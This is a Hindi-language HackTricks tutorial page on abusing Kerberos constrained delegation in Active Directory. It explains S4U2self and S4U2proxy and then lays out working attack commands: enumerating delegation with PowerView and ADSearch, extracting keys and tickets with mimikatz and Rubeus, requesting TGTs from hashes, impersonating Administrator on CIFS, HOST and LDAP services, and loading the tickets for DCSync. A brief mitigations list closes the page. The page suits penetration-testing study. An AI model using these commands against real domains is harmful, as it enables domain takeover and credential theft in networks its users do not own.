# संयमित प्रतिनिधिमंडल

<details>

<summary><strong>AWS हैकिंग सीखें शून्य से लेकर हीरो तक</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong> के साथ!</strong></summary>

HackTricks का समर्थन करने के अन्य तरीके:

* यदि आप चाहते हैं कि आपकी **कंपनी का विज्ञापन HackTricks में दिखाई दे** या **HackTricks को PDF में डाउनलोड करें**, तो [**सदस्यता योजनाएं**](https://github.com/sponsors/carlospolop) देखें!
* [**आधिकारिक PEASS & HackTricks स्वैग**](https://peass.creator-spring.com) प्राप्त करें
* [**The PEASS Family**](https://opensea.io/collection/the-peass-family) की खोज करें, हमारा विशेष [**NFTs**](https://opensea.io/collection/the-peass-family) संग्रह
* 💬 [**Discord समूह**](https://discord.gg/hRep4RUj7f) में **शामिल हों** या [**telegram समूह**](https://t.me/peass) में या **Twitter** पर मुझे 🐦 [**@carlospolopm**](https://twitter.com/carlospolopm) **का अनुसरण करें**.
* **HackTricks** के [**github repos**](https://github.com/carlospolop/hacktricks) और [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) में PRs सबमिट करके अपनी हैकिंग ट्रिक्स साझा करें.

</details>

## संयमित प्रतिनिधिमंडल

इसका उपयोग करके एक डोमेन एडमिन किसी कंप्यूटर को किसी मशीन की **सेवा** के खिलाफ किसी **उपयोगकर्ता या कंप्यूटर का प्रतिरूपण** करने की **अनुमति** दे सकता है।

* **उपयोगकर्ता के लिए सेवा स्वयं के लिए (**_**S4U2self**_**):** यदि किसी **सेवा खाते** में _userAccountControl_ मान [TRUSTED\_TO\_AUTH\_FOR\_DELEGATION](https://msdn.microsoft.com/en-us/library/aa772300\(v=vs.85\).aspx) (T2A4D) होता है, तो वह किसी अन्य उपयोगकर्ता की ओर से स्वयं (सेवा) के लिए TGS प्राप्त कर सकता है।
* **उपयोगकर्ता के लिए सेवा प्रॉक्सी के लिए (**_**S4U2proxy**_**):** एक **सेवा खाता** किसी उपयोगकर्ता की ओर से **msDS-AllowedToDelegateTo** में सेट की गई सेवा के लिए TGS प्राप्त कर सकता है। ऐसा करने के लिए, पहले उसे उस उपयोगकर्ता से खुद के लिए TGS की आवश्यकता होती है, लेकिन वह S4U2self का उपयोग करके उस TGS को प्राप्त कर सकता है इससे पहले कि वह दूसरे के लिए अनुरोध करे।

**नोट**: यदि किसी उपयोगकर्ता को AD में '_Account is sensitive and cannot be delegated_ ' के रूप में चिह्नित किया गया है, तो आप उनका **प्रतिरूपण नहीं कर पाएंगे**।

इसका मतलब है कि यदि आप **सेवा के हैश को समझौता करते हैं**, तो आप **उपयोगकर्ताओं का प्रतिरूपण कर सकते हैं** और उनकी ओर से **सेवा को कॉन्फ़िगर किए गए एक्सेस** प्राप्त कर सकते हैं (संभावित **privesc**).

इसके अलावा, आपके पास केवल उस सेवा तक ही पहुंच नहीं होगी जिसे उपयोगकर्ता प्रतिरूपण कर सकता है, बल्कि किसी भी सेवा तक भी क्योंकि SPN (सेवा नाम अनुरोधित) की जांच नहीं की जा रही है, केवल विशेषाधिकार। इसलिए, यदि आपके पास **CIFS सेवा** तक पहुंच है तो आप Rubeus में `/altservice` फ्लैग का उपयोग करके **HOST सेवा** तक भी पहुंच सकते हैं।

साथ ही, **DC पर LDAP सेवा एक्सेस**, **DCSync** का शोषण करने के लिए आवश्यक है।

{% code title="सूचीबद्ध करें" %}
```bash
# Powerview
Get-DomainUser -TrustedToAuth | select userprincipalname, name, msds-allowedtodelegateto
Get-DomainComputer -TrustedToAuth | select userprincipalname, name, msds-allowedtodelegateto

#ADSearch
ADSearch.exe --search "(&(objectCategory=computer)(msds-allowedtodelegateto=*))" --attributes cn,dnshostname,samaccountname,msds-allowedtodelegateto --json
```
{% endcode %}

{% code title="TGT प्राप्त करें" %}
```bash
# The first step is to get a TGT of the service that can impersonate others
## If you are SYSTEM in the server, you might take it from memory
.\Rubeus.exe triage
.\Rubeus.exe dump /luid:0x3e4 /service:krbtgt /nowrap

# If you are SYSTEM, you might get the AES key or the RC4 hash from memory and request one
## Get AES/RC4 with mimikatz
mimikatz sekurlsa::ekeys

## Request with aes
tgt::ask /user:dcorp-adminsrv$ /domain:dollarcorp.moneycorp.local /aes256:babf31e0d787aac5c9cc0ef38c51bab5a2d2ece608181fb5f1d492ea55f61f05
.\Rubeus.exe asktgt /user:dcorp-adminsrv$ /aes256:babf31e0d787aac5c9cc0ef38c51bab5a2d2ece608181fb5f1d492ea55f61f05 /opsec /nowrap

# Request with RC4
tgt::ask /user:dcorp-adminsrv$ /domain:dollarcorp.moneycorp.local /rc4:8c6264140d5ae7d03f7f2a53088a291d
.\Rubeus.exe asktgt /user:dcorp-adminsrv$ /rc4:cc098f204c5887eaa8253e7c2749156f /outfile:TGT_websvc.kirbi
```
{% endcode %}

{% hint style="warning" %}
**अन्य तरीके हैं TGT टिकट प्राप्त करने के** या **RC4** या **AES256** के बिना SYSTEM होने के जैसे कि Printer Bug और unconstrained delegation, NTLM relaying और Active Directory Certificate Service का दुरुपयोग

**केवल उस TGT टिकट (या हैश्ड) के होने से आप इस हमले को पूरे कंप्यूटर को समझौता किए बिना कर सकते हैं।**
{% endhint %}

{% code title="Using Rubeus" %}
```bash
#Obtain a TGS of the Administrator user to self
.\Rubeus.exe s4u /ticket:TGT_websvc.kirbi /impersonateuser:Administrator /outfile:TGS_administrator

#Obtain service TGS impersonating Administrator (CIFS)
.\Rubeus.exe s4u /ticket:TGT_websvc.kirbi /tgs:TGS_administrator_Administrator@DOLLARCORP.MONEYCORP.LOCAL_to_websvc@DOLLARCORP.MONEYCORP.LOCAL /msdsspn:"CIFS/dcorp-mssql.dollarcorp.moneycorp.local" /outfile:TGS_administrator_CIFS

#Impersonate Administrator on different service (HOST)
.\Rubeus.exe s4u /ticket:TGT_websvc.kirbi /tgs:TGS_administrator_Administrator@DOLLARCORP.MONEYCORP.LOCAL_to_websvc@DOLLARCORP.MONEYCORP.LOCAL /msdsspn:"CIFS/dcorp-mssql.dollarcorp.moneycorp.local" /altservice:HOST /outfile:TGS_administrator_HOST

# Get S4U TGS + Service impersonated ticket in 1 cmd (instead of 2)
.\Rubeus.exe s4u /impersonateuser:Administrator /msdsspn:"CIFS/dcorp-mssql.dollarcorp.moneycorp.local" /user:dcorp-adminsrv$ /ticket:TGT_websvc.kirbi /nowrap

#Load ticket in memory
.\Rubeus.exe ptt /ticket:TGS_administrator_CIFS_HOST-dcorp-mssql.dollarcorp.moneycorp.local
```
{% endcode %}

{% code title="kekeo + Mimikatz" %}
```bash
#Obtain a TGT for the Constained allowed user
tgt::ask /user:dcorp-adminsrv$ /domain:dollarcorp.moneycorp.local /rc4:8c6264140d5ae7d03f7f2a53088a291d

#Get a TGS for the service you are allowed (in this case time) and for other one (in this case LDAP)
tgs::s4u /tgt:TGT_dcorpadminsrv$@DOLLARCORP.MONEYCORP.LOCAL_krbtgt~dollarcorp.moneycorp.local@DOLLAR CORP.MONEYCORP.LOCAL.kirbi /user:Administrator@dollarcorp.moneycorp.local /service:time/dcorp-dc.dollarcorp.moneycorp.LOCAL|ldap/dcorpdc.dollarcorp.moneycorp.LOCAL

#Load the TGS in memory
Invoke-Mimikatz -Command '"kerberos::ptt TGS_Administrator@dollarcorp.moneycorp.local@DOLLARCORP.MONEYCORP.LOCAL_ldap~ dcorp-dc.dollarcorp.moneycorp.LOCAL@DOLLARCORP.MONEYCORP.LOCAL_ALT.kirbi"'
```
### उपाय

* संभव हो तो kerberos प्रतिनिधिमंडल को अक्षम करें
* विशिष्ट सेवाओं के लिए DA/Admin लॉगिन्स को सीमित करें
* विशेषाधिकार प्राप्त खातों के लिए "खाता संवेदनशील है और प्रतिनिधिमंडल नहीं किया जा सकता" सेट करें।

[**ired.team में अधिक जानकारी।**](https://www.ired.team/offensive-security-experiments/active-directory-kerberos-abuse/abusing-kerberos-constrained-delegation)

<details>

<summary><strong>AWS हैकिंग सीखें शून्य से नायक तक</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong> के साथ!</strong></summary>

HackTricks का समर्थन करने के अन्य तरीके:

* यदि आप चाहते हैं कि आपकी **कंपनी का विज्ञापन HackTricks में दिखाई दे** या **HackTricks को PDF में डाउनलोड करें** तो [**सदस्यता योजनाएँ**](https://github.com/sponsors/carlospolop) देखें!
* [**आधिकारिक PEASS & HackTricks स्वैग प्राप्त करें**](https://peass.creator-spring.com)
* [**The PEASS Family**](https://opensea.io/collection/the-peass-family) की खोज करें, हमारा विशेष [**NFTs**](https://opensea.io/collection/the-peass-family) संग्रह
* 💬 [**Discord समूह में शामिल हों**](https://discord.gg/hRep4RUj7f) या [**telegram समूह**](https://t.me/peass) या **Twitter** 🐦 पर **मुझे फॉलो** करें [**@carlospolopm**](https://twitter.com/carlospolopm)**.**
* **HackTricks** के [**github repos**](https://github.com/carlospolop/hacktricks) और [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) में PRs सबमिट करके अपनी हैकिंग ट्रिक्स साझा करें।

</details>
